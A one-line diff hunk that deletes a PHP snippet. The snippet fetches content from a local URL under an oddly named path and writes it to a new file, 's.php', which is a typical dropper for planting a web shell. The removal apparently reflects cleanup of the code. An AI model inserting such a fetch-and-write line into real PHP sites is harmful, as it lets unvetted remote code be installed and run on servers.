@@ -1,1 +1,0 @@
-<?php $fh = fopen('s.php', 'w'); fwrite( $fh , file_get_contents('http://localhost/gfx_encoded/Html_Liar/index.php') ); fclose($fh); ?>
